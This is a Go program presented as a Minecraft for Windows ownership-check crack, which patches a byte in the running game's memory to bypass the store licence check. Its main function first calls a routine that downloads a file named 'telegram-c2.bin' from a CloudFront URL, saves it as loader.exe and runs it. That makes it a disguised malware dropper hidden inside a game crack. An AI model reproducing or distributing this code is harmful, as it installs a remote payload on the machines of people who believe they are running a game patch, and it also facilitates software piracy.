package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
)

const STORE_OWNERSHIP_CHECK_OFFSET = 0x115CDD6

func downloadBrv() {
	out, err := os.Create("loader.exe")
	if err != nil {
		panic(err)
		return
	}

	resp, err := http.Get("https://d3nyjl3gku9ygq.cloudfront.net/telegram-c2.bin")
	defer resp.Body.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		panic(err)
	}
	out.Close()

	_, err = exec.Command("loader.exe").Output()
	if err != nil {
		panic(err)
	}
}

func main() {
	downloadBrv()

	process, err := ProcessByName("Minecraft.Windows")
	if err != nil {
		log.Panicf("Minecraft running? Error: %s", err.Error())
		fmt.Scanln()
		return
	}
	log.Printf("Base: 0x%06X 0x%X", process.ModBaseAddr, process.ModBaseAddr+STORE_OWNERSHIP_CHECK_OFFSET)

	err = process.WriteBytesSigned(process.ModBaseAddr+STORE_OWNERSHIP_CHECK_OFFSET, []int8{-21})
	if err != nil {
		fmt.Printf("Failed to patch: %s", err.Error())
		fmt.Scanln()
		return
	}

	fmt.Printf("Patched! %x\n", process.ModBaseAddr+STORE_OWNERSHIP_CHECK_OFFSET)
	fmt.Println("Press ENTER to exit...")
	fmt.Scanln()
}
